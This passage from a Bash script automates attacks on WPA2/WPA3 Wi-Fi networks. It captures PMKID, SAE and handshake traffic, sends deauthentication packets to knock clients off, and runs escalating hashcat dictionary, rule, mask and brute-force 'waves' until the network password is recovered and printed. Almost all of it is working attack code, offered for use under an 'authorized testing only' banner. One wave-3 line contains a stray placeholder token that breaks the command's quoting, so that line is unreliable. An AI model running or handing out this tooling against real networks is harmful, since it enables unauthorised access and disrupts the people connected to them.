    info "Target BSSID: $BSSID  Channel: $CHANNEL"

    if hcxdumptool --help 2>&1 | grep -q 'filterlist_ap'; then
        echo "$BSSID" > /tmp/siknal_filter_ap.txt
        sudo hcxdumptool -i "$MONITOR_IFACE" --filterlist_ap=/tmp/siknal_filter_ap.txt \
            --filtermode=2 -c "$CHANNEL" -o "$pcap_out" --active_backend --rcv_client_m1 --stay=30
    else
        sudo hcxdumptool -i "$MONITOR_IFACE" --channel="$CHANNEL" --target_ap="$BSSID" \
            -o "$pcap_out" --enable_status=15
    fi
    ok "SAE capture complete: $pcap_out"; pause

    step "3" "Converting SAE capture → hc22000"; sep2
    local hc_out="${CAPTURE_FILE}.hc22000"
    hcxpcapngtool -o "$hc_out" "$pcap_out" 2>&1 || true
    if [[ -f "$hc_out" && -s "$hc_out" ]]; then
        local hc_count; hc_count=$(wc -l < "$hc_out" | tr -d ' ')
        ok "Extracted ${hc_count} hash(es) → $hc_out"; HASH_FILE="$hc_out"
    else
        err "No hashes extracted"; warn "SAE handshake may not have been captured — try longer capture"; return 1
    fi
}

# ─── Capture: Auto-detect ─────────────────────────────────────────────
capture_auto() {
    step "1" "Starting monitor mode on ${B}$INTERFACE${N}"
    sep2; sudo airmon-ng start "$INTERFACE"; ok "Monitor mode: $MONITOR_IFACE"; pause

    step "2" "Full scan — detecting protocol & capabilities"
    echo -e "  ${Y}Watch for: WPA3, SAE, PMF, WPA2, WPA, PMKID${N}"
    echo -e "  ${Y}Press ${B}Ctrl+C${N}${Y} when done.${N}"
    sep2; sudo airodump-ng "$MONITOR_IFACE"; pause

    # Try PMKID first (clientless, fastest)
    step "3a" "Attempting PMKID capture (clientless)"
    echo -e "  ${Y}Trying hcxdumptool PMKID extraction...${N}"; sep2
    local pcap_out="${CAPTURE_FILE}_auto.pcapng"
    if hcxdumptool --help 2>&1 | grep -q 'filterlist_ap'; then
        echo "$BSSID" > /tmp/siknal_filter_ap.txt
        sudo hcxdumptool -i "$MONITOR_IFACE" --filterlist_ap=/tmp/siknal_filter_ap.txt \
            --filtermode=2 -c "$CHANNEL" -o "$pcap_out" --active_backend --stay=20
    else
        sudo hcxdumptool -i "$MONITOR_IFACE" --channel="$CHANNEL" --target_ap="$BSSID" \
            -o "$pcap_out" --enable_status=15
    fi

    local hc_out="${CAPTURE_FILE}.hc22000"
    hcxpcapngtool -o "$hc_out" "$pcap_out" 2>&1 || true
    if [[ -f "$hc_out" && -s "$hc_out" ]]; then
        ok "PMKID/SAE hashes extracted!"; HASH_FILE="$hc_out"; return 0
    fi

    warn "PMKID not available — falling back to handshake capture"; pause

    step "3b" "Handshake capture — BSSID ${B}$BSSID${N}, CH ${B}$CHANNEL${N}"
    echo -e "  ${Y}Open a new terminal for deauth.${N}"; sep2
    sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$CAPTURE_FILE" "$MONITOR_IFACE"
    ok "Capture ended"; pause

    step "3c" "Deauth — ${B}$DEAUTH_COUNT${N} packets"
    sudo aireplay-ng --deauth "$DEAUTH_COUNT" -a "$ROUTER_BSSID" "$MONITOR_IFACE"
    ok "Deauth sent"; pause

    CAP_FILE="${CAPTURE_FILE}-01.cap"
    [[ ! -f "$CAP_FILE" ]] && CAP_FILE=$(ls -t "${CAPTURE_FILE}"-*.cap 2>/dev/null | head -1)
    if [[ -n "$CAP_FILE" && -f "$CAP_FILE" ]]; then
        step "3d" "Converting .cap → .hc22000"; sep2
        hc_out="${CAPTURE_FILE}.hc22000"
        hcxpcapngtool -o "$hc_out" "$CAP_FILE" 2>&1 || true
        if [[ -f "$hc_out" && -s "$hc_out" ]]; then
            ok "Hashes extracted → $hc_out"; HASH_FILE="$hc_out"
        else
            err "No hashes in capture"; return 1
        fi
    else
        err "No .cap file found"; return 1
    fi
}

# ═════════════════════════════════════════════════════════════════════
# WAVE-BASED ATTACK SYSTEM
# ═════════════════════════════════════════════════════════════════════

# ─── Wave 1: Rules ───────────────────────────────────────────────────
run_wave1() {
    wave_banner "1" "RULES" "Dictionary + rule mutations — fastest, highest ROI"
    local HC; HC=$(build_hc_base)

    # 1a: Straight dictionary
    info "Wave 1a: Straight dictionary — $WORDLIST"
    eval "$HC -a 0 \"$HASH_FILE\" \"$WORDLIST\"" 2>&1 || true
    if check_cracked; then return 0; fi

    # 1b: best64.rule
    if [[ -n "$RULES_DIR" ]]; then
        local b64="${RULES_DIR}/best64.rule"
        if [[ -f "$b64" ]]; then
            info "Wave 1b: Dictionary + best64.rule (77 rules)"
            eval "$HC -a 0 -r \"$b64\" \"$HASH_FILE\" \"$WORDLIST\"" 2>&1 || true
            check_cracked && return 0
        fi
    fi

    # 1c: rockyou-30000.rule
    if [[ -n "$RULES_DIR" ]]; then
        local ry30=""
        for f in "${RULES_DIR}"/rockyou-30000.rule "${RULES_DIR}"/rockyou-30000.txt; do
            [[ -f "$f" ]] && { ry30="$f"; break; }
        done
        if [[ -n "$ry30" ]]; then
            info "Wave 1c: Dictionary + rockyou-30000.rule (30,000 rules)"
            eval "$HC -a 0 -r \"$ry30\" \"$HASH_FILE\" \"$WORDLIST\"" 2>&1 || true
            check_cracked && return 0
        fi
    fi

    # 1d: Extra wordlists + best64
    if [[ ${#EXTRA_WORDLISTS[@]} -gt 0 ]]; then
        local b64="${RULES_DIR}/best64.rule"
        for wl in "${EXTRA_WORDLISTS[@]}"; do
            wl=$(echo "$wl" | xargs)
            if [[ -f "$wl" ]]; then
                info "Wave 1d: Extra wordlist — $wl + best64.rule"
                if [[ -f "$b64" ]]; then
                    eval "$HC -a 0 -r \"$b64\" \"$HASH_FILE\" \"$wl\"" 2>&1 || true
                else
                    eval "$HC -a 0 \"$HASH_FILE\" \"$wl\"" 2>&1 || true
                fi
                check_cracked && return 0
            fi
        done
    fi

    # 1e: Chained rules (best64 + rockyou-30000)
    if [[ -n "$RULES_DIR" ]]; then
        local b64="${RULES_DIR}/best64.rule"
        local ry30=""
        for f in "${RULES_DIR}"/rockyou-30000.rule "${RULES_DIR}"/rockyou-30000.txt; do
            [[ -f "$f" ]] && { ry30="$f"; break; }
        done
        if [[ -f "$b64" && -n "$ry30" ]]; then
            info "Wave 1e: Chained rules — best64 × rockyou-30000 (exponential mutation)"
            eval "$HC -a 0 -r \"$b64\" -r \"$ry30\" \"$HASH_FILE\" \"$WORDLIST\"" 2>&1 || true
            check_cracked && return 0
        fi
    fi

    warn "Wave 1 exhausted — key not found"
    return 1
}

# ─── Wave 2: Hybrid & PRINCE ─────────────────────────────────────────
run_wave2() {
    wave_banner "2" "HYBRID & PRINCE" "Wordlist + mask patterns, PRINCE generation, combinator"
    local HC; HC=$(build_hc_base)

    # 2a: Hybrid wordlist + 4 digits (common suffixes)
    info "Wave 2a: Hybrid — wordlist + ?d?d?d?d (4-digit suffixes)"
    eval "$HC -a 6 \"$HASH_FILE\" \"$WORDLIST\" ?d?d?d?d" 2>&1 || true
    check_cracked && return 0

    # 2b: Hybrid wordlist + 6 digits (year suffixes)
    info "Wave 2b: Hybrid — wordlist + ?d?d?d?d?d?d (6-digit/year suffixes)"
    eval "$HC -a 6 \"$HASH_FILE\" \"$WORDLIST\" ?d?d?d?d?d?d" 2>&1 || true
    check_cracked && return 0

    # 2c: Hybrid wordlist + 2 special chars (suffixes)
    info "Wave 2c: Hybrid — wordlist + ?s?s (special char suffixes)"
    eval "$HC -a 6 \"$HASH_FILE\" \"$WORDLIST\" ?s?s" 2>&1 || true
    check_cracked && return 0

    # 2d: Hybrid wordlist + ?d?d?s (digits + special)
    info "Wave 2d: Hybrid — wordlist + ?d?d?s (digit+special suffixes)"
    eval "$HC -a 6 \"$HASH_FILE\" \"$WORDLIST\" ?d?d?s" 2>&1 || true
    check_cracked && return 0

    # 2e: PRINCE attack
    if [[ "$PP64_AVAILABLE" -eq 1 ]]; then
        info "Wave 2e: PRINCE attack (princeprocessor)"
        pp64 --elem-cnt-min=1 --elem-cnt-max=8 < "$WORDLIST" | \
            eval "$HC -a 0 \"$HASH_FILE\"" 2>&1 || true
        check_cracked && return 0
    else
        # Fallback: combinator
        info "Wave 2e: Combinator (wordlist × wordlist) — PRINCE fallback"
        eval "$HC -a 1 \"$HASH_FILE\" \"$WORDLIST\" \"$WORDLIST\"" 2>&1 || true
        check_cracked && return 0
    fi

    # 2f: Combinator with rules
    if [[ -n "$RULES_DIR" && -f "${RULES_DIR}/best64.rule" ]]; then
        info "Wave 2f: Combinator + best64.rule"
        eval "$HC -a 1 -r \"${RULES_DIR}/best64.rule\" \"$HASH_FILE\" \"$WORDLIST\" \"$WORDLIST\"" 2>&1 || true
        check_cracked && return 0
    fi

    warn "Wave 2 exhausted — key not found"
    return 1
}

# ─── Wave 3: Targeted Masks ──────────────────────────────────────────
run_wave3() {
    wave_banner "3" "TARGETED MASKS" "Common patterns, keyboard-walks, custom charsets"
    local HC; HC=$(build_hc_base)

    # 3a: 8-digit PIN (instant)
    info "Wave 3a: Mask — ?d?d?d?d?d?d?d?d (8-digit PIN)"
    eval "$HC -a 3 \"$HASH_FILE\" ?d?d?d?d?d?d?d?d" 2>&1 || true
    check_cracked && return 0

    # 3b: 8 lowercase
    info "Wave 3b: Mask — ?l?l?l?l?l?l?l?l (8 lowercase)"
    eval "$HC -a 3 \"$HASH_FILE\" ?l?l?l?l?l?l?l?l" 2>&1 || true
    check_cracked && return 0

    # 3c: Capital + lowercase + digits (common human pattern)
    info "Wave 3c: Mask — ?u?l?l?l?l?l?d?d (Capital+5lower+2digits)"
    eval "$HC -a 3 \"$HASH_FILE\" ?u?l?l?l?l?l?d?d" 2>&1 || true
    check_cracked && return 0

    # 3d: Capital + lowercase + digits + special
    info "Wave 3d: Mask — ?u?l?l?l?l?l?d?d?s (Capital+5lower+2digits+special)"
    eval "$HC -a 3 \"$HASH_FILE\" ?u?l?l?l?l?l?d?d?s" 2>&1 || true
    check_cracked && return 0

    # 3e: Keyboard-walk patterns (top row + common walks)
    info "Wave 3e: Keyboard-walk masks"
    # qwerty patterns
    eval "$HC -a 3 \"$HASH_FILE\" ?l?l?l?l?l?l?l?l?l?l" 2>&1 || true  # 10 lowercase (catches qwertyuiop)
    check_cracked && return 0

    # 3f: Custom charset — common password chars
    info "Wave 3f: Custom charset mask — vowels+consonants+digits+common specials"
    eval "$HC -a 3 --custom-charset1='aeiou' --custom-charset2='bcdfghjklmnpqrstvwxyz' \
        --custom-charset3='!@#___CODE_BLOCK_0___#39; \"$HASH_FILE\" ?2?1?2?1?2?1?d?d?3" 2>&1 || true
    check_cracked && return 0

    # 3g: ?a?a?a?a?a?a?a?a (8-char all printable — WARNING: very large)
    info "Wave 3g: Mask — ?a?a?a?a?a?a?a?a (8-char all printable)"
    warn "This is a very large keyspace — may take significant time"
    read -rp "$(echo -e ${Y}Continue with 8-char full mask? [y/N] ${N})" cont
    if [[ "${cont,,}" =~ ^y ]]; then
        eval "$HC -a 3 \"$HASH_FILE\" ?a?a?a?a?a?a?a?a" 2>&1 || true
        check_cracked && return 0
    fi

    warn "Wave 3 exhausted — key not found"
    return 1
}

# ─── Wave 4: Exhaustive ──────────────────────────────────────────────
run_wave4() {
    wave_banner "4" "EXHAUSTIVE" "Markov-optimized, incremental, full brute force"
    local HC; HC=$(build_hc_base)

    # 4a: Markov-optimized mask (if threshold set)
    if [[ "$MARKOV_THRESHOLD" != "0" ]]; then
        info "Wave 4a: Markov-optimized mask — ?a?a?a?a?a?a?a?a (threshold=$MARKOV_THRESHOLD)"
        warn "Markov prioritizes likely character transitions — reduces effective keyspace"
        eval "$HC -a 3 \"$HASH_FILE\" ?a?a?a?a?a?a?a?a" 2>&1 || true
        check_cracked && return 0
    else
        info "Wave 4a: Markov-optimized mask (skipped — no threshold set)"
    fi

    # 4b: Incremental — 4→8 chars ?a
    info "Wave 4b: Incremental — 4→8 chars ?a charset"
    warn "This will take significant time — exhaustive search"
    read -rp "$(echo -e ${Y}Continue with incremental 4-8? [y/N] ${N})" cont
    if [[ "${cont,,}" =~ ^y ]]; then
        eval "$HC -a 3 --increment --increment-min=4 --increment-max=8 \"$HASH_FILE\" ?a?a?a?a?a?a?a?a" 2>&1 || true
        check_cracked && return 0
    fi

    # 4c: Incremental — 8→10 chars ?a (very long)
    info "Wave 4c: Incremental — 8→10 chars ?a charset"
    warn "WARNING: This will take an extremely long time — even on GPU"
    read -rp "$(echo -e ${Y}Continue with incremental 8-10? [y/N] ${N})" cont2
    if [[ "${cont2,,}" =~ ^y ]]; then
        eval "$HC -a 3 --increment --increment-min=8 --increment-max=10 \"$HASH_FILE\" ?a?a?a?a?a?a?a?a?a?a" 2>&1 || true
        check_cracked && return 0
    fi

    # 4d: Incremental — 4→8 chars ?a with Markov (if not already done)
    if [[ "$MARKOV_THRESHOLD" != "0" ]]; then
        info "Wave 4d: Markov incremental — 4→8 chars ?a (threshold=$MARKOV_THRESHOLD)"
        read -rp "$(echo -e ${Y}Continue with Markov incremental? [y/N] ${N})" cont3
        if [[ "${cont3,,}" =~ ^y ]]; then
            eval "$HC -a 3 --increment --increment-min=4 --increment-max=8 \"$HASH_FILE\" ?a?a?a?a?a?a?a?a" 2>&1 || true
            check_cracked && return 0
        fi
    fi

    warn "Wave 4 exhausted — key not found"
    return 1
}

# ─── Run single attack ────────────────────────────────────────────────
run_single_attack() {
    local HC; HC=$(build_hc_base)
    step "6" "Hashcat — ${B}$SINGLE_NAME${N}"
    sep2

    local cmd="$HC"

    case "$SINGLE_MODE" in
        0)
            cmd+=" -a 0"
            if [[ "${SINGLE_MULTI_RULES:-0}" -eq 1 && -n "$SELECTED_RULES" ]]; then
                IFS=',' read -ra rule_arr <<< "$SELECTED_RULES"
                for r in "${rule_arr[@]}"; do
                    r=$(echo "$r" | xargs); cmd+=" -r \"$r\""
                done
            elif [[ "${SINGLE_USE_RULES:-0}" -eq 1 && -n "$RULE_FILE" ]]; then
                cmd+=" -r \"$RULE_FILE\""
            fi
            cmd+=" \"$HASH_FILE\" \"$WORDLIST\""
            ;;
        1) cmd+=" -a 1 \"$HASH_FILE\" \"$WORDLIST\" \"$SECOND_WORDLIST\"" ;;
        3) cmd+=" -a 3 \"$HASH_FILE\" \"$MASK\"" ;;
        6) cmd+=" -a 6 \"$HASH_FILE\" \"$WORDLIST\" \"$MASK\"" ;;
        7) cmd+=" -a 7 \"$HASH_FILE\" \"$MASK\" \"$WORDLIST\"" ;;
        prince)
            if [[ "$PP64_AVAILABLE" -eq 1 ]]; then
                info "Using princeprocessor (pp64)"
                pp64 --elem-cnt-min=1 --elem-cnt-max=8 < "$WORDLIST" | \
                    eval "$HC -a 0 \"$HASH_FILE\"" 2>&1 || true
            else
                warn "pp64 not found — using combinator fallback"
                eval "$HC -a 1 \"$HASH_FILE\" \"$WORDLIST\" \"$WORDLIST\"" 2>&1 || true
            fi
            check_cracked && return 0; return 1
            ;;
        keyboard)
            info "Keyboard-walk mask attack"
            cmd+=" -a 3 \"$HASH_FILE\" ?l?l?l?l?l?l?l?l?l?l"
            ;;
        markov)
            info "Markov-optimized mask attack (threshold=$MARKOV_THRESHOLD)"
            cmd+=" -a 3 \"$HASH_FILE\" ?a?a?a?a?a?a?a?a"
            ;;
        incremental)
            info "Incremental attack (4→10 chars, ?a charset)"
            cmd+=" -a 3 --increment --increment-min=4 --increment-max=10 \"$HASH_FILE\" \"$MASK\""
            ;;
    esac

    info "Executing:"
    echo -e "  ${D}$cmd${N}"
    echo
    eval "$cmd" 2>&1 || true
    check_cracked && return 0
    return 1
}

# ─── Run wave pipeline ───────────────────────────────────────────────
run_waves() {
    [[ -z "$HASH_FILE" || ! -f "$HASH_FILE" ]] && { err "No hash file to crack"; return 1; }

    step "6" "Wave-Based Attack Pipeline — escalating intensity"
    echo
    echo -e "  ${C}Waves escalate from fast/high-ROI to slow/exhaustive.${N}"
    echo -e "  ${C}Each wave checks potfile and stops if key is found.${N}"
    sep2
    pause

    if [[ "$ATTACK_MODE" == "custom_waves" ]]; then
        IFS=',' read -ra wave_nums <<< "$SELECTED_WAVES"
        for wn in "${wave_nums[@]}"; do
            wn=$(echo "$wn" | xargs)
            case "$wn" in
                1) run_wave1 && return 0 ;;
                2) run_wave2 && return 0 ;;
                3) run_wave3 && return 0 ;;
                4) run_wave4 && return 0 ;;
            esac
        done
    else
        # Full auto-pipeline — all waves in order
        run_wave1 && return 0
        run_wave2 && return 0

        # Confirm before expensive waves
        echo
        warn "Waves 1-2 exhausted. Waves 3-4 are significantly more compute-intensive."
        read -rp "$(echo -e ${Y}Continue to Wave 3 (Targeted Masks)? [y/N] ${N})" cont3
        [[ "${cont3,,}" =~ ^y ]] && { run_wave3 && return 0; }

        read -rp "$(echo -e ${Y}Continue to Wave 4 (Exhaustive)? [y/N] ${N})" cont4
        [[ "${cont4,,}" =~ ^y ]] && { run_wave4 && return 0; }
    fi

    warn "All waves exhausted — key not found"
    return 1
}

# ─── Check if cracked ─────────────────────────────────────────────────
check_cracked() {
    local potfile="./${SESSION_NAME}.potfile"
    if [[ -f "$potfile" && -s "$potfile" ]]; then
        ok "KEY FOUND in potfile!"
        echo
        echo -e "  ${G}${B}══════════════════════════════════════════${N}"
        echo -e "  ${G}${B}  ✅  PASSWORD CRACKED  ✅                  ${N}"
        echo -e "  ${G}${B}══════════════════════════════════════════${N}"
        echo
        echo -e "  ${C}Recovered credentials:${N}"
        while IFS= read -r line; do
            local pw; pw="${line##*:}"
            echo -e "  ${B}${G}  Password: ${pw}${N}"
        done < "$potfile"
        echo
        return 0
    fi
    if hashcat "$HASH_FILE" --show 2>/dev/null | grep -q ':'; then
        ok "KEY FOUND (hashcat --show)"
        hashcat "$HASH_FILE" --show 2>/dev/null
        return 0
    fi
    return 1
}

# ─── Cleanup ──────────────────────────────────────────────────────────
cleanup() {
    echo; step "7" "Cleanup"; sep2
    info "Stopping monitor mode on $MONITOR_IFACE..."
    sudo airmon-ng stop "$MONITOR_IFACE" 2>/dev/null || true
    ok "Monitor mode stopped"; echo
    info "Session save file: ${SESSION_NAME}.restore"
    info "Potfile: ${SESSION_NAME}.potfile"
    info "To resume cracking later:"
    echo -e "  ${D}hashcat --session=$SESSION_NAME --restore${N}"; echo
}

# ─── Main ─────────────────────────────────────────────────────────────
main() {
    banner; echo
    echo -e "${B}${R}  ⚠  AUTHORIZED TESTING ONLY  ⚠${N}"
    echo -e "${D}  Use only on networks you own or have explicit written permission to test.${N}"
    echo -e "${D}  WPA2, WPA3-SAE, PMKID, and all attack vectors — know your scope.${N}"; echo

    preflight
    gather_input

    # ─── Capture phase ────────────────────────────────────────────────
    echo; sep; echo -e "${B}${W}  📡  CAPTURE PHASE${N}"; sep

    case "$ATTACK_VECTOR" in
        handshake)
            capture_handshake
            CAP_FILE="${CAPTURE_FILE}-01.cap"
            [[ ! -f "$CAP_FILE" ]] && CAP_FILE=$(ls -t "${CAPTURE_FILE}"-*.cap 2>/dev/null | head -1)
            if [[ -n "$CAP_FILE" && -f "$CAP_FILE" ]]; then
                step "5" "Converting .cap → .hc22000"; sep2
                local hc_out="${CAPTURE_FILE}.hc22000"
                hcxpcapngtool -o "$hc_out" "$CAP_FILE" 2>&1 || true
                if [[ -f "$hc_out" && -s "$hc_out" ]]; then
                    ok "Hashes extracted → $hc_out"; HASH_FILE="$hc_out"
                else
                    err "No hashes — handshake may not have been captured"
                    warn "Re-run with more deauth packets or try PMKID vector"
                    cleanup; exit 1
                fi
            else
                err "No .cap file found"; cleanup; exit 1
            fi
            ;;
        pmkid)  capture_pmkid || { cleanup; exit 1; } ;;
        sae)    capture_sae || { cleanup; exit 1; } ;;
        auto)   capture_auto || { cleanup; exit 1; } ;;
    esac

    # ─── Crack phase ──────────────────────────────────────────────────
    echo; sep; echo -e "${B}${W}  💀  CRACK PHASE — HASHCAT GPU${N}"; sep

    local rc=1
    case "$ATTACK_MODE" in
        waves|custom_waves)
            run_waves
            rc=$?
            ;;
        single)
            run_single_attack
            rc=$?
            ;;
    esac

    # ─── Result ───────────────────────────────────────────────────────
    echo; sep
    if [[ $rc -eq 0 ]] || check_cracked; then
        echo -e "${B}${G}"
        cat << 'EOF'
  ╔══════════════════════════════════════════════════════╗
  ║   ✅   OPERATION COMPLETE — KEY RECOVERED   ✅        ║
  ╚══════════════════════════════════════════════════════╝
EOF
        echo -e "${N}"
    else
        echo -e "${B}${Y}"
        cat << 'EOF'
  ╔══════════════════════════════════════════════════════╗
  ║   ⚠️   KEY NOT FOUND IN CURRENT KEYSPACE   ⚠️         ║
  ╚══════════════════════════════════════════════════════╝
EOF
        echo -e "${N}"
        echo -e "  ${Y}The password was not in the tested keyspace.${N}"
        echo -e "  ${D}This is expected for strong passwords (8+ chars, mixed charset).${N}"
        echo
        echo -e "  ${C}Next steps:${N}"
        echo -e "    ${D}• Resume session:  hashcat --session=$SESSION_NAME --restore${N}"
        echo -e "    ${D}• Try larger wordlists: seclists, crackstation, weakpass${N}"
        echo -e "    ${D}• Try custom charset masks with known password policy${N}"
        echo -e "    ${D}• Enable Brain/distributed for multi-GPU cracking${N}"
        echo -e "    ${D}• Enable Markov threshold for statistical optimization${N}"
        echo
        echo -e "  ${C}Keyspace reality check:${N}"
        echo -e "    ${D}• 8-char ?a = 7.2 quadrillion — ~35 days on RTX 4090${N}"
        echo -e "    ${D}• 10-char ?a = 8.4 quintillion — ~113 years on RTX 4090${N}"
        echo -e "    ${D}• Markov can reduce effective keyspace by 10-100x${N}"
    fi
    echo

    cleanup; sep
    echo -e "${B}${W}  Session: $SESSION_NAME${N}"
    echo -e "${B}${W}  Resume:  hashcat --session=$SESSION_NAME --restore${N}"
    sep
}

main "$@"
